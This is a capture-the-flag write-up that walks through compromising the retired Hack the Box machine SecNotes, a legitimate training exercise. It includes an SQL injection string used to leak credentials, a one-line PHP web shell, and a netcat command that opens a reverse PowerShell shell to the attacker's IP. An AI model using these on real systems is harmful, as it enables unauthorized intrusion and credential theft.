+++
author = "Nick"
categories = ["CTF", "NetSec"]
date = 2019-01-22T17:03:09Z
description = ""
draft = false
thumbnail = "/images/2019/01/info.PNG"
slug = "hack-the-box-secnotes"
summary = "Hack the Box - SecNotes machine. Lets get root!"
tags = ["CTF", "NetSec"]
title = "Hack the Box - SecNotes"
url = "/hack-the-box-secnotes"

+++


Well, this will be my 11th write up for HtB, however, you aren't allowed to post a write up until a box has been retired. So I guess this is will actually be my first published write up on this site!

For those that are unfamiliar with what Hack the Box is, it's a simple capture the flag in digital space. In this case the flag is Administrative shell and credentials for users on the target machine. Let's dig in!

As always, we start by gathering info on our target with a basic nmap scan:

```bash
nmap -sC -sV -oA 10.10.10.97

That comes back with some basic things, we see port 80 and 445. We see that it's a Windows 10 machine running Enterprise build 17134. My guy reaction here is MS17-010 but that build might be too new to exploit. Lets check anyway.

```bash
ost script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2018-11-22T06:21:10-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-11-22 09:21:12
|_  start_date: N/A

There are a few ways to check this exploit but this time, we'll just use Metasploit since it has a MS17-010 scanner module. If you aren't familiar with where it is in Metasploit you can always use the search command to find it:

```bash
search ms17_010

![](/images/2019/01/ms17_check.PNG)

Now we load up the module and give it our target data:

```bash
use auxiliary/scanner/smb/smb_ms17_010

![](/images/2019/01/ms17_check2.PNG" caption="MS17-010 scanner hasn't found anything.)

It would appear the machine is not vulnerable. No biggy, we can run ms-17-010 against is if we think this data is false, but it usually isn't. Lets keep moving, we also saw port 80 open, lets browse to it and see what it is.

![](/images/2019/01/site.PNG" caption="Some type of login it seems)

Well, it seems to direct us to a login page of some type. So we try our usual, admin / admin. Admin with 1 space and amin with 2 spaces at the end. Sometimes this works due to lazy comparisons. Nothing, well, lets try and sign up for an account. We can sign up and get logged in. It's some type of note system.

![](/images/2019/01/pafge.PNG)

Lets create a note with some html.

![](/images/2019/01/note1.PNG)

Sure enough, we see the form isn't filtering any html:

![](/images/2019/01/note2.PNG" caption="potential xss?)

Well, that could be fun, lets check out the other pages and see what can be done. When we look at the change password page source, we notice there is not any CSRF tokens or protection of any type. Lets launch Burpe Suite and see what is being posted when we fill this field out.

![](/images/2019/01/burp1.PNG" caption="Well isn't that fun...)

So we can see that it's just passing in a password change via post. If we were to forward this page link to the site admin and they read it, we could passively change the password for the admin user. The question is how do we get the admin to read the link? (more on that later).

Well that could be our best way in, before we commit to that method, lets check for any php injections. Lets go back and create a user name of Love'"!@#$%^&*()[];<>. This should let us see if anything can be broken.

![](/images/2019/01/500.PNG" caption="What do we have here?)

Well, it looks like we can break this somehow. In this case I just removed the last set of special characters from our name until I found what seemed to be broken. So I used Love'"– - nothing, Love'!– - nothing, But then I got to Love';– - and that seemed to be the ticket. So do we craft an SQL injection statement? It was at this part I began to overthink the execution. So I just went back to basics with a injection method. ' OR '1'='1. Sure enough that gave be back some data in Burpe yet a error 500 on the web interface... odd. We had gotten back three notes, a recipe, some years and credentials.

![](/images/2019/01/html_cred.PNG" caption="Credentials for a user named tyler, awesome!)

So it seems our secure notes app wasn't so secure after all. It looks like they're going to spin up a new site, awesome. The notation above shows it's an SMB share something our nmap also gave us. Lets enumerate our shares on this machine and see what we get. We can enumerate SMB shares with a tool called SMBmap.

![](/images/2019/01/smbenum.PNG" caption="We give smbmap a username and password.)

Looks like we have the normal shares and our newly found new-site share. Lets connect using smbclient.

![](/images/2019/01/smb_dir_muchbetter.PNG" caption="We give smbclient a target and a user, we are then prompted for a password.&nbsp;)

When we list the directories we see the standard IIS html and png. We can't seem to path up either. We have write access, lets try to put a file on the directory. Sure enough we can upload a file to the share. So how to we get to that site? It wasn't found at /new-site or any other iteration of that. It's not uncommon for devs to create test site locally on other ports. Lets try to scan all the ports and see what comes back.

![](/images/2019/01/nmap2.PNG)

Looks like we have something running on 8808, lets browse to it. Looks like the basic IIS start page, awesome. Lets create a basic html file and upload it and see if we can access that.

![](/images/2019/01/put.PNG)

![](/images/2019/01/test1.PNG)

Looks like it worked! Now, based on our previous nmap scans, we know that the site is running PHP. A common method of attack here is to create a PHP script to upload a vector of attack and have the IIS system run that file. So this is exactly what we'll do. The first time I ran through this attack, I was using a reverse Meterpeter payload but that seemed to keep dropping connection after ~30 seconds or so. Since that wasn't working out I decided to try the old standby of Netcat.

The first thing we need to do is download Netcat. Then we'll upload it to our new-site share. Once we've done that we'll write a quick and dirty php file to execute the commands we issue it.

![](/images/2019/01/nc64.PNG" caption="We connect via smbclient again and issue a put command.)

Now that our file is there, lets write a quick PHP one liner. PHP has a function called [passthru](https://secure.php.net/manual/en/function.passthru.php)(). This allow us to execute a command on the system. At first I wrote this with the exec() function in PHP but it didn't seem to like the arguments I was feeding it, probably has something to do with the lack of PHP knowledge I have. We create a new file called loveshell.php. In this file we will write the following:

```php
<?php passthrue($_REQUEST["run"]);?>

When we call this webpage, we can then feed it commands like this:

http://10.10.10.97/new-site/loveshell.php?run=dir

In the case above, the server will execute the 'dir' command and give us the results on the page.

![](/images/2019/01/result.PNG)

So lets upload our file to the server using smbclient again. Now before we execute anything, we need to start our Netcat listener on our machine.

![](/images/2019/01/nclisten.PNG" caption="We use the -n for ip only, the -v for verbose, the -l for listen for inbound only and the -p for our port)

Now that we're listening, lets feed our php shell a netcat command. We want netcat to start a powershell session and forward it to us. To do that we issue the following:

```bash
nc64.exe 10.10.13.37 9909 -e powershell

This create a powershell session and forwards it to our machine on port 9909. Previously I had created the session with CMD prompt but that was lacking in features. So lets drop this into our URL bar and see what we get!

![](/images/2019/01/urlsend.PNG)

![](/images/2019/01/reverse_powershell.PNG)

Once we issue the command we see our Netcat listener light up and become active! We now have a Powershell prompt. Lets go get our user credentials! We path to the desktop and sure enough, they are here. A quick more user.txt gives us what we are looking for.

![](/images/2019/01/user.PNG)

Now how do we escalate our privileges? There are a few ways of doing this but I feel like I took that path that was blatantly right in front of me. As we traversed the directories to get to Tyler's desktop we noticed a few things. The first being a directory for Distros listed under the C drive. When we path down it, we notice that there is a Ubuntu directory with Ubuntu.exe. So whats interesting about this is that this file is meant to run Ubuntu within Windows. Very much like the windows bash sub-features. Along side this on Tyler's Desktop there was a shortcut named bash.lnk. When we look at the content of that shortcut we see it's pointing to a bash.exe in System32.

![](/images/2019/01/bash.PNG" caption="bash.exe in System32? What could this be?)

Since that shortcut is linked to the System32, we should be able to call it from our powershell command prompt.

![](/images/2019/01/bash1.PNG)

Sure enough, we can. So who are we in this bash shell? Turns out we're root. Maybe we can path to Administrator now and get credentials!

![](/images/2019/01/whoami.PNG)

So we path to /mnt/c/users/Administrator and see what we can see.

![](/images/2019/01/admin1.PNG" caption="Denied!)

Nothing, we still don't seem to actually have root privileges. So lets go back to our starting point and see whats there. When we list the content of our home directory we see a directory called 'filesystem'. More importantly we see .bash_history, usually this has some breadcrumbs we can follow.

![](/images/2019/01/listing.PNG)

We list the contents of 'filesystem' but there seems to be nothing there. Lets check the contents of the .bash_history. When we do we see some admin credentials. Awesome, lets use those credentials to connect back to the system via SMB!

![](/images/2019/01/cat_bash.PNG" caption="The % after the administrator is the delimiter for the smbclient tool.)

Once again we open our smbclient and connect as administrator using the above credentials. Once we're in, we simply path to the Desktop and view our root.txt.

![](/images/2019/01/root.PNG)

There we have it. Another box down. It should be noted there are other ways to own this box. The above is just the path that I followed as I'm much more familiar with infrastructure access and pathways vs web access.

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

